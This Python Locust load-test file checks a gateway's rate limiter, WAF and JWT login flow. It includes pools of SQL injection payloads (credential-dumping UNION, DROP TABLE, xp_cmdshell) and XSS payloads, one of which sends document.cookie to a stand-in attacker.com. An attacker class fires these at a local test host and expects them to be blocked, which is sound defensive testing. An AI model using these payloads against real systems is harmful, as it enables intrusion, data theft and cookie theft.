"""
ShieldFlow — Locust Load Test
================================
Simulates realistic traffic patterns to validate:
  1. Rate Limiter behavior under sustained high concurrency
  2. WAF performance with mixed clean/attack payloads
  3. JWT auth flow under load
  4. System throughput and response time distribution

Usage:
  # Interactive web UI:
  locust -f locustfile.py --host http://localhost:8000

  # Headless CI mode:
  locust -f locustfile.py --headless -u 100 -r 10 --run-time 60s --host http://localhost:8000

  # Attack simulation:
  locust -f locustfile.py --headless -u 50 -r 5 --run-time 30s --host http://localhost:8000 -t AttackerUser
"""

from __future__ import annotations

import random
import time

from locust import HttpUser, between, events, tag, task
from locust.runners import MasterRunner

# ── Payload pools ─────────────────────────────────────────────────────────────

CLEAN_MESSAGES = [
    "Hello, world!",
    "What is the weather today?",
    "Show me the latest products",
    "My order ID is 12345",
    "Search query: python programming",
    "Filter by: price < 100",
    "User registration: john@example.com",
    "Dashboard overview",
    "Latest news articles",
    "Product reviews for item #42",
]

SQLI_PAYLOADS = [
    "' UNION SELECT username, password FROM users--",
    "admin' OR 1=1--",
    "1; DROP TABLE orders;",
    "' AND SLEEP(5)--",
    "1 UNION SELECT table_name FROM information_schema.tables",
    "'; EXEC xp_cmdshell('dir')--",
    "' OR '1'='1' /*",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:document.write('<h1>hacked</h1>')",
    "<svg onload=fetch('//attacker.com?c='+document.cookie)>",
    "${alert(1)}",
    "<body onload=alert('XSS')>",
    "{{7*7}}",
    "<iframe src=javascript:alert(1)>",
]


# ── Shared auth token store ───────────────────────────────────────────────────
_auth_tokens: dict[str, str] = {}


# ── User Behaviors ────────────────────────────────────────────────────────────

class LegitimateUser(HttpUser):
    """
    Simulates a normal API consumer.
    Mix of authenticated and public requests, realistic inter-request delays.
    """
    wait_time = between(0.5, 2.0)
    weight = 70  # 70% of virtual users

    def on_start(self):
        """Authenticate at the start of each user session."""
        self._login()

    def _login(self):
        """Obtain a JWT token via the auth endpoint."""
        credentials = random.choice([
            {"username": "admin", "password": "supersecret"},
            {"username": "developer", "password": "devpassword"},
        ])
        with self.client.post(
            "/api/v1/auth/token",
            json=credentials,
            catch_response=True,
            name="POST /auth/token (login)",
        ) as response:
            if response.status_code == 200:
                self._access_token = response.json().get("access_token", "")
                self._refresh_token = response.json().get("refresh_token", "")
                response.success()
            else:
                self._access_token = ""
                self._refresh_token = ""
                response.failure(f"Login failed: {response.status_code}")

    @property
    def auth_headers(self) -> dict:
        return {"Authorization": f"Bearer {self._access_token}"}

    @task(5)
    def public_echo(self):
        """High-frequency public endpoint access."""
        message = random.choice(CLEAN_MESSAGES)
        self.client.get(
            "/api/v1/gateway/echo",
            params={"message": message},
            name="GET /gateway/echo (public)",
        )

    @task(3)
    def authenticated_echo(self):
        """Authenticated POST to the echo endpoint."""
        message = random.choice(CLEAN_MESSAGES)
        self.client.post(
            "/api/v1/gateway/echo",
            json={"message": message, "metadata": {"session": "load_test"}},
            headers=self.auth_headers,
            name="POST /gateway/echo (auth)",
        )

    @task(2)
    def get_profile(self):
        """Access the user profile endpoint."""
        self.client.get(
            "/api/v1/auth/me",
            headers=self.auth_headers,
            name="GET /auth/me",
        )

    @task(1)
    def refresh_tokens(self):
        """Periodically rotate tokens."""
        if not self._refresh_token:
            return
        with self.client.post(
            "/api/v1/auth/refresh",
            json={"refresh_token": self._refresh_token},
            catch_response=True,
            name="POST /auth/refresh",
        ) as response:
            if response.status_code == 200:
                data = response.json()
                self._access_token = data.get("access_token", self._access_token)
                self._refresh_token = data.get("refresh_token", self._refresh_token)
                response.success()
            else:
                response.failure(f"Refresh failed: {response.status_code}")

    @task(1)
    def health_check(self):
        """Occasional health check (monitoring simulation)."""
        self.client.get("/health", name="GET /health")


class AggressiveUser(HttpUser):
    """
    Simulates a user who sends many rapid requests.
    Tests the rate limiter under burst conditions.
    """
    wait_time = between(0.05, 0.2)  # Very fast — 5–20 req/s per user
    weight = 20  # 20% of virtual users

    def on_start(self):
        self._login()

    def _login(self):
        response = self.client.post(
            "/api/v1/auth/token",
            json={"username": "developer", "password": "devpassword"},
            name="POST /auth/token (aggressive login)",
        )
        if response.status_code == 200:
            self._access_token = response.json().get("access_token", "")
        else:
            self._access_token = ""

    @task(10)
    def rapid_requests(self):
        """Flood the public endpoint to trigger rate limiting."""
        with self.client.get(
            "/api/v1/gateway/echo",
            params={"message": "rapid fire request"},
            catch_response=True,
            name="GET /gateway/echo (rapid)",
        ) as response:
            if response.status_code == 429:
                # Rate limited — this is EXPECTED behavior, mark as success
                response.success()
            elif response.status_code == 200:
                response.success()
            else:
                response.failure(f"Unexpected status: {response.status_code}")


class AttackerUser(HttpUser):
    """
    Simulates a malicious actor sending SQLi and XSS payloads.
    All requests from this user should be blocked (HTTP 403).
    Used to validate WAF blocking rate under load.
    """
    wait_time = between(0.1, 0.5)
    weight = 10  # 10% of virtual users

    @task(5)
    def sqli_attack(self):
        """SQL Injection attack — must be blocked with 403."""
        payload = random.choice(SQLI_PAYLOADS)
        with self.client.get(
            "/api/v1/gateway/echo",
            params={"message": payload},
            catch_response=True,
            name="GET /gateway/echo (SQLi attack)",
        ) as response:
            if response.status_code == 403:
                response.success()  # Correctly blocked ✓
            elif response.status_code == 429:
                response.success()  # Rate limited before WAF ✓
            else:
                response.failure(
                    f"SQLi NOT blocked! Status: {response.status_code}, payload: {payload[:50]}"
                )

    @task(5)
    def xss_attack(self):
        """XSS attack — must be blocked with 403."""
        payload = random.choice(XSS_PAYLOADS)
        with self.client.get(
            "/api/v1/gateway/echo",
            params={"message": payload},
            catch_response=True,
            name="GET /gateway/echo (XSS attack)",
        ) as response:
            if response.status_code == 403:
                response.success()  # Correctly blocked ✓
            elif response.status_code == 429:
                response.success()  # Rate limited ✓
            else:
                response.failure(
                    f"XSS NOT blocked! Status: {response.status_code}, payload: {payload[:50]}"
                )

    @task(2)
    def sqli_in_header(self):
        """SQLi injected via custom header."""
        payload = random.choice(SQLI_PAYLOADS)
        with self.client.get(
            "/api/v1/gateway/echo",
            params={"message": "normal"},
            headers={"X-Custom": payload},
            catch_response=True,
            name="GET /gateway/echo (SQLi header attack)",
        ) as response:
            if response.status_code in (403, 429):
                response.success()
            else:
                response.failure(f"Header SQLi not blocked! Status: {response.status_code}")


# ── Test Events (printed to console during test) ──────────────────────────────
@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print("""
╔══════════════════════════════════════════════════════════╗
║       ShieldFlow — Load Test Starting                    ║
║                                                          ║
║  User Mix:                                               ║
║    • LegitimateUser (70%) — Normal API consumers         ║
║    • AggressiveUser  (20%) — Rate limit stress test      ║
║    • AttackerUser   (10%) — WAF validation               ║
║                                                          ║
║  Expected behavior:                                      ║
║    • Legitimate users: mostly 200s                       ║
║    • Aggressive users: mix of 200s and 429s              ║
║    • Attackers: 100% 403s (if WAF working correctly)     ║
╚══════════════════════════════════════════════════════════╝
    """)


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    stats = environment.stats
    print(f"""
╔══════════════════════════════════════════════════════════╗
║       ShieldFlow — Load Test Complete                    ║
╠══════════════════════════════════════════════════════════╣
║  Total requests:  {stats.total.num_requests:>10,}                     ║
║  Failed requests: {stats.total.num_failures:>10,}                     ║
║  Avg response:    {stats.total.avg_response_time:>10.1f}ms                  ║
║  95th percentile: {stats.total.get_response_time_percentile(0.95):>10.1f}ms                  ║
╚══════════════════════════════════════════════════════════╝
    """)
